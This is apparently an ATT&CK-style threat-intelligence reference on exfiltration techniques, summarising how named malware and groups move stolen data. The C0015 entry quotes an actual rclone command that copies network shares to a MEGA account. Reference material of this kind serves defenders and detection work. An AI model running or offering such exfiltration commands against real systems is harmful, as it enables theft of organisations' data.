### T1011.001 - Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth

Procedures:

- [S0143] Flame: Flame has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.


### T1020.001 - Automated Exfiltration: Traffic Duplication

Procedures:

- Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image. Many cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. Adversaries may use traffic duplication in conjunction with Network Sniffing, Input Capture, or Adversary-in-the-Middle depending on the goals and objectives of the adversary.


### T1029 - Scheduled Transfer

Procedures:

- [S0283] jRAT: jRAT can be configured to reconnect at certain intervals.
- [S0696] Flagpro: Flagpro has the ability to wait for a specified time interval between communicating with and executing commands from C2.
- [S1019] Shark: Shark can pause C2 communications for a specified time.
- [S0395] LightNeuron: LightNeuron can be configured to exfiltrate data during nighttime or working hours.
- [S0223] POWERSTATS: POWERSTATS can sleep for a given number of seconds.
- [S0200] Dipsind: Dipsind can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.
- [S0126] ComRAT: ComRAT has been programmed to sleep outside local business hours (9 to 5, Monday to Friday).
- [S0045] ADVSTORESHELL: ADVSTORESHELL collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.
- [S0211] Linfo: Linfo creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.
- [S1100] Ninja: Ninja can configure its agent to work only in specific time frames.
- [S0154] Cobalt Strike: Cobalt Strike can set its Beacon payload to reach out to the C2 server on an arbitrary and random interval.
- [S0444] ShimRat: ShimRat can sleep when instructed to do so by the C2.
- [S0409] Machete: Machete sends stolen data to the C2 server every 10 minutes.
- [G0126] Higaisa: Higaisa sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.
- [S0596] ShadowPad: ShadowPad has sent data back to C2 every 8 hours.


### T1030 - Data Transfer Size Limits

Procedures:

- [G1040] Play: Play has split victims' files into chunks for exfiltration.
- [G1014] LuminousMoth: LuminousMoth has split archived files into multiple parts to bypass a 5MB limit.
- [G0027] Threat Group-3390: Threat Group-3390 actors have split RAR files for exfiltration into parts.
- [S0264] OopsIE: OopsIE exfiltrates command output and collected files to its C2 server in 1500-byte blocks.
- [S0150] POSHSPY: POSHSPY uploads data in 2048-byte chunks.
- [C0026] C0026: During C0026, the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.
- [S0487] Kessel: Kessel can split the data to be exilftrated into chunks that will fit in subdomains of DNS queries.
- [S1020] Kevin: Kevin can exfiltrate data to the C2 server in 27-character chunks.
- [S0644] ObliqueRAT: ObliqueRAT can break large files of interest into smaller chunks to prepare them for exfiltration.
- [S1200] StealBit: StealBit can be configured to exfiltrate files at a specified rate to evade network detection mechanisms.
- [S0622] AppleSeed: AppleSeed has divided files if the size is 0x1000000 bytes or more.
- [S0154] Cobalt Strike: Cobalt Strike will break large data sets into smaller chunks for exfiltration.
- [S0495] RDAT: RDAT can upload a file via HTTP POST response to the C2 split into 102,400-byte portions. RDAT can also download data from the C2 which is split into 81,920-byte portions.
- [S0699] Mythic: Mythic supports custom chunk sizes used to upload/download files.
- [S1040] Rclone: The Rclone "chunker" overlay supports splitting large files in smaller chunks during upload to circumvent size limits.


### T1041 - Exfiltration Over C2 Channel

Procedures:

- [S1172] OilBooster: OilBooster can use an actor-controlled OneDrive account for C2 communication and exfiltration.
- [S0459] MechaFlounder: MechaFlounder has the ability to send the compromised user's account name and hostname within a URL to C2.
- [S0428] PoetRAT: PoetRAT has exfiltrated data over the C2 channel.
- [S0445] ShimRatReporter: ShimRatReporter sent generated reports to the C2 via HTTP POST requests.
- [S1019] Shark: Shark has the ability to upload files from the compromised host over a DNS or HTTP C2 channel.
- [S1210] Sagerunex: Sagerunex encrypts collected system data then exfiltrates via existing command and control channels.
- [S0533] SLOTHFULMEDIA: SLOTHFULMEDIA has sent system information to a C2 server via HTTP and HTTPS POST requests.
- [S1183] StrelaStealer: StrelaStealer exfiltrates collected email credentials via HTTP POST to command and control servers.
- [S1017] OutSteel: OutSteel can upload files from a compromised host over its C2 channel.
- [S0234] Bandook: Bandook can upload files from a victim's machine over the C2 channel.
- [S0431] HotCroissant: HotCroissant has the ability to download files from the infected host to the command and control (C2) server.
- [S1021] DnsSystem: DnsSystem can exfiltrate collected data to its C2 server.
- [S0409] Machete: Machete's collected data is exfiltrated over the same channel used for C2.
- [S1039] Bumblebee: Bumblebee can send collected data in JSON format to C2.
- [S0584] AppleJeus: AppleJeus has exfiltrated collected host information to a C2 server.


### T1048.001 - Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol

Procedures:

- Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).

### T1048.002 - Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

Procedures:

- [G0007] APT28: APT28 has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS.
- [S0483] IcedID: IcedID has exfiltrated collected data via HTTPS.
- [G1012] CURIUM: CURIUM has used SMTPS to exfiltrate collected data from victims.
- [S1040] Rclone: Rclone can exfiltrate data over SFTP or HTTPS via WebDAV.
- [G1046] Storm-1811: Storm-1811 has exfiltrated captured user credentials via Secure Copy Protocol (SCP).
- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.

### T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol

Procedures:

- [G0032] Lazarus Group: Lazarus Group malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.
- [G0061] FIN8: FIN8 has used FTP to exfiltrate collected data.
- [S0125] Remsec: Remsec can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.
- [S0492] CookieMiner: CookieMiner has used the curl --upload-file command to exfiltrate data over HTTP.
- [S1043] ccf32: ccf32 can upload collected data and files to an FTP server.
- [S1116] WARPWIRE: WARPWIRE can send captured credentials to C2 via HTTP `GET` or `POST` requests.
- [S0356] KONNI: KONNI has used FTP to exfiltrate reconnaissance data out.
- [S0252] Brave Prince: Some Brave Prince variants have used South Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.
- [S0674] CharmPower: CharmPower can send victim data via FTP with credentials hardcoded in the script.
- [S0050] CosmicDuke: CosmicDuke exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.
- [G0076] Thrip: Thrip has used WinSCP to exfiltrate data from a targeted organization over FTP.
- [G0050] APT32: APT32's backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.
- [S0212] CORALDECK: CORALDECK has exfiltrated data in HTTP POST headers.
- [G1045] Salt Typhoon: Salt Typhoon has exfiltrated configuration files from exploited network devices over FTP and TFTP.
- [G0102] Wizard Spider: Wizard Spider has exfiltrated victim information using FTP.


### T1052.001 - Exfiltration Over Physical Medium: Exfiltration over USB

Procedures:

- [S0035] SPACESHIP: SPACESHIP copies staged data to removable drives when they are inserted into the system.
- [S0125] Remsec: Remsec contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.
- [S0136] USBStealer: USBStealer exfiltrates collected files via removable media from air-gapped victims.
- [G0081] Tropic Trooper: Tropic Trooper has exfiltrated data using USB storage devices.
- [G0129] Mustang Panda: Mustang Panda has used a customized PlugX variant which could exfiltrate documents from air-gapped networks.
- [S0092] Agent.btz: Agent.btz creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.
- [S0409] Machete: Machete has a feature to copy files from every drive onto a removable drive in a hidden folder.


### T1537 - Transfer Data to Cloud Account

Procedures:

- [G1032] INC Ransom: INC Ransom has used Megasync to exfiltrate data to the cloud.
- [G1039] RedCurl: RedCurl has used cloud storage to exfiltrate data, in particular the megatools utilities were used to exfiltrate data to Mega, a file storage service.


### T1567.001 - Exfiltration Over Web Service: Exfiltration to Code Repository

Procedures:

- [S0363] Empire: Empire can use GitHub for data exfiltration.

### T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage

Procedures:

- [G0065] Leviathan: Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.
- [G1024] Akira: Akira will exfiltrate victim data using applications such as Rclone.
- [G1014] LuminousMoth: LuminousMoth has exfiltrated data to Google Drive.
- [S1040] Rclone: Rclone can exfiltrate data to cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA.
- [S0629] RainyDay: RainyDay can use a file exfiltration tool to upload specific files to Dropbox.
- [S1023] CreepyDrive: CreepyDrive can use cloud services including OneDrive for data exfiltration.
- [S0037] HAMMERTOSS: HAMMERTOSS exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.
- [G0094] Kimsuky: Kimsuky has exfiltrated stolen files and data to actor-controlled Blogspot accounts.
- [G0027] Threat Group-3390: Threat Group-3390 has exfiltrated stolen data to Dropbox.
- [S1170] ODAgent: ODAgent can use an attacker-controlled OneDrive account for exfiltration.
- [G0142] Confucius: Confucius has exfiltrated victim data to cloud storage service accounts.
- [G1005] POLONIUM: POLONIUM has exfiltrated stolen data to POLONIUM-owned OneDrive and Dropbox accounts.
- [G1001] HEXANE: HEXANE has used cloud services, including OneDrive, for data exfiltration.
- [C0015] C0015: During C0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the Rclone command `rclone.exe copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.
- [S0660] Clambling: Clambling can send files from a victim's machine to Dropbox.

### T1567.003 - Exfiltration Over Web Service: Exfiltration to Text Storage Sites

Procedures:

- Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as pastebin[.]com, are commonly used by developers to share code and other information. Text storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely. **Note:** This is distinct from Exfiltration to Code Repository, which highlight access to code repositories via APIs.

### T1567.004 - Exfiltration Over Web Service: Exfiltration Over Webhook

Procedures:

- Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server. Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello. When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated Automated Exfiltration of emails, chat messages, and other data. Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it. Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.

